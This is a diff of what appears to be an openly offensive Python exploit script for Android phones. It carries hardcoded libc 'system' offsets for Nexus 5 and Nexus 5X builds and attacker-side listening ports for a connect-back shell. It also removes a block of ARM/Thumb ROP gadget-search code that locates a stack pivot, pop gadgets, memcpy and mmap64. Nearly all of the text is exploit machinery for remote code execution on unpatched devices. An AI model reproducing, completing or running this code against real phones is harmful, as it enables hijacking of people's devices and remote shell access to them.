@@ -13,135 +13,6 @@ import connectback
 
 from pwn import log
 
-import pwnlib.asm as asm
-
-import os
-import pwnlib.asm as asm
-import pwnlib.elf as elf
-import sys
-import struct
-
-# ROP gadget addresses
-stack_pivot = None
-pop_pc = None
-pop_r1_r4_r5_r7_pc = None
-pop_r0_r3_r5_r6_pc = None
-pop_r1_r2_r3_r4_pc = None
-
-pop_r4_r5_r6_r7_pc = None
-ldr_lr_bx_lr = None
-ldr_lr_bx_lr_stack_pad = 0
-mmap64 = None
-memcpy = None
-
-
-def pad(size):
-  return '#' * size
- 
-def pb32(val):
-  return struct.pack(">I", val)
- 
-def pb64(val):
-  return struct.pack(">Q", val)
- 
-def p32(val):
-  return struct.pack("<I", val)
- 
-def p64(val):
-  return struct.pack("<Q", val)
-
-def find_arm_gadget(e, gadget):
-  gadget_bytes = asm.asm(gadget, arch='arm')
-  gadget_address = None
-  for address in e.search(gadget_bytes):
-    if address % 4 == 0:
-      gadget_address = address
-      if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
-        print asm.disasm(gadget_bytes, vma=gadget_address, arch='arm')
-        break
-  return gadget_address
-  
-def find_thumb_gadget(e, gadget):
-  gadget_bytes = asm.asm(gadget, arch='thumb')
-  gadget_address = None
-  for address in e.search(gadget_bytes):
-    if address % 2 == 0:
-      gadget_address = address + 1
-      if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
-        print asm.disasm(gadget_bytes, vma=gadget_address-1, arch='thumb')
-        break
-  return gadget_address
-    
-def find_gadget(e, gadget):
-  gadget_address = find_thumb_gadget(e, gadget)
-  if gadget_address is not None:
-    return gadget_address
-  return find_arm_gadget(e, gadget)
-  
-def find_rop_gadgets(path):
-  global memcpy
-  global mmap64
-  global stack_pivot
-  global pop_pc
-  global pop_r0_r3_r5_r6_pc
-  global pop_r1_r2_r3_r4_pc
-  global pop_r4_r5_r6_r7_pc
- 
-
-  global ldr_lr_bx_lr
-  global ldr_lr_bx_lr_stack_pad
-  
-  e = elf.ELF(path)
-  e.address =  0xb43f7000
-  
-  memcpy = e.symbols['memcpy']
-  print '[*] memcpy : 0x{:08x}'.format(memcpy)
-  mmap64 = e.symbols['mmap64']
-  print '[*] mmap64 : 0x{:08x}'.format(mmap64)
-  
-  # .text:00013344    ADD             R2, R0, #0x4C
-  # .text:00013348    LDMIA           R2, {R4-LR}
-  # .text:0001334C    TEQ             SP, #0
-  # .text:00013350    TEQNE           LR, #0
-  # .text:00013354    BEQ             botch_0
-  # .text:00013358    MOV             R0, R1
-  # .text:0001335C    TEQ             R0, #0
-  # .text:00013360    MOVEQ           R0, #1
-  # .text:00013364    BX              LR
-  
-  #pivot_asm = ''
-  #pivot_asm += 'add   r2, r0, #0x4c\n'
-  #pivot_asm += 'ldmia r2, {r4 - lr}\n'
-  #pivot_asm += 'teq   sp, #0\n'
-  #pivot_asm += 'teqne lr, #0'
-  #stack_pivot = find_arm_gadget(e, pivot_asm)
-  #print '[*] stack_pivot : 0x{:08x}'.format(stack_pivot)
-  
-  #pop_pc_asm = 'pop {pc}'
-  #pop_pc = find_gadget(e, pop_pc_asm)
-  #print '[*] pop_pc : 0x{:08x}'.format(pop_pc)
-  
-  #pop_r1_r2_r3_r4_pc = find_gadget(e, 'pop {r1, r2, r3, r4, pc}')
-  #print '[*] pop_r1_r2_r3_r4_pc : 0x{:08x}'.format(pop_r1_r2_r3_r4_pc)
-
-  #pop_r0_r3_r5_r6_pc = find_gadget(e, 'pop {r0, r3, r5, r6, pc}')
-  #print '[*] pop_r0_r3_r5_r6_pc : 0x{:08x}'.format(pop_r0_r3_r5_r6_pc)
- 
-  #pop_r4_r5_r6_r7_pc = find_gadget(e, 'pop {r4, r5, r6, r7, pc}')
-  #print '[*] pop_r4_r5_r6_r7_pc : 0x{:08x}'.format(pop_r4_r5_r6_r7_pc)
-
-  
-  ldr_lr_bx_lr_stack_pad = 0
-  for i in range(0, 0x100, 4):
-    ldr_lr_bx_lr_asm =  'ldr lr, [sp, #0x{:08x}]\n'.format(i)
-    ldr_lr_bx_lr_asm += 'add sp, sp, #0x{:08x}\n'.format(i + 8)
-    ldr_lr_bx_lr_asm += 'bx  lr'
-    ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)
-    if ldr_lr_bx_lr is not None:
-      ldr_lr_bx_lr_stack_pad = i
-      break
-    
-  
 
 # Listening TCP ports that need to be opened on the attacker machine
 NC_PORT = 1233
@@ -162,7 +33,7 @@ STDIN_PORT = 1235
 
 # Nexus 5 6.0.1
 #LIBC_TEXT_STSTEM_OFFSET = 0x1fff0+ 1 # system + 1
-LIBC_TEXT_STSTEM_OFFSET = 0x46b4d+ 1
+LIBC_TEXT_STSTEM_OFFSET = 0x46b4d + 1
 LIBC_SOME_BLX_OFFSET = 0x9f9
 
 # For Nexus 5X 7.1.2 patch level Aug/July 2017
